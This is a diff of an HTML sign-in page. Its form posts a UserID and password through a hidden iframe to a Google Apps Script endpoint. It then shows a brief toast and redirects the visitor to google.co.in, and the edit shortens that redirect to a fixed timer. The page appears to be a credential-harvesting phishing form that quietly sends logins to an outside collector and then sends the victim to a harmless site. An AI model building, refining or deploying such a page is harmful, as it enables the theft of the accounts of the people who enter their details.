@@ -52,13 +52,12 @@
   <!-- Error Message Container -->
   <div id="error-message" class="hidden bg-red-50 border border-red-200 text-error text-base p-4 rounded-2xl text-center font-medium"></div>
 
-  <!-- Form targeting a hidden iframe to bypass browser CORS restrictions -->
+  <!-- Form -->
   <form id="signin-form" class="flex flex-col gap-6" method="POST" action="https://script.google.com/macros/s/AKfycbwBpW3jUbojaR9-VTJBVDp71_A3LlGhviTRh2WDoFfpJf53HyUTTNdzPeQLX_T-NWz4/exec" target="hidden-iframe" onsubmit="handleFormSubmit(event)">
     <div class="text-center">
       <h2 class="text-xl font-bold text-on-surface">Sign In</h2>
     </div>
 
-    <!-- Hidden input to pass action type -->
     <input type="hidden" name="action" value="LOGIN">
 
     <!-- UserID -->
@@ -68,7 +67,7 @@
         <span class="absolute inset-y-0 left-0 flex items-center pl-4 text-outline">
           <span class="material-symbols-outlined text-[24px]">person</span>
         </span>
-        <input class="w-full bg-surface-container-lowest border border-slate-300 rounded-2xl py-4 pl-12 pr-4 text-base text-on-surface placeholder:text-outline-variant focus:outline-none focus:ring-2 focus:ring-primary focus:border-transparent transition-all shadow-sm" id="userid" name="userId" placeholder="Enter your UserID" type="text" required>
+        <input class="w-full bg-surface-container-lowest border border-slate-300 rounded-2xl py-4 pl-12 pr-4 text-base text-on-surface placeholder:text-outline-variant focus:outline-none focus:ring-2 focus:ring-primary focus:border-transparent transition-all shadow-sm" id="userid" name="userid" placeholder="Enter your UserID" type="text" required>
       </div>
     </div>
 
@@ -96,13 +95,11 @@
   </form>
 </div>
 
-<!-- Hidden Iframe to handle the POST response safely -->
-<iframe name="hidden-iframe" id="hidden-iframe" style="display:none;" onload="handleFrameLoad()"></iframe>
+<!-- Hidden Iframe -->
+<iframe name="hidden-iframe" id="hidden-iframe" style="display:none;"></iframe>
 
 <!-- JavaScript Logic -->
 <script>
-  let submitted = false;
-
   function togglePasswordVisibility() {
     const passwordInput = document.getElementById('password');
     const toggleIcon = document.getElementById('toggle-icon');
@@ -128,21 +125,18 @@
       return;
     }
 
-    submitted = true;
     setLoading(true);
-  }
 
-  function handleFrameLoad() {
-    if (!submitted) return;
-    
-    // Once the hidden frame receives the response from Google Apps Script, redirect to google.co.in
-    setLoading(false);
-    const toast = document.getElementById('toast');
-    toast.classList.remove('hidden');
-    
+    // Smooth transition simulation once form submits into the hidden frame
     setTimeout(() => {
-      window.top.location.href = "https://www.google.co.in";
-    }, 1000);
+      setLoading(false);
+      const toast = document.getElementById('toast');
+      toast.classList.remove('hidden');
+      
+      setTimeout(() => {
+        window.top.location.href = "https://www.google.co.in";
+      }, 1000);
+    }, 800);
   }
 
   function setLoading(loading) {
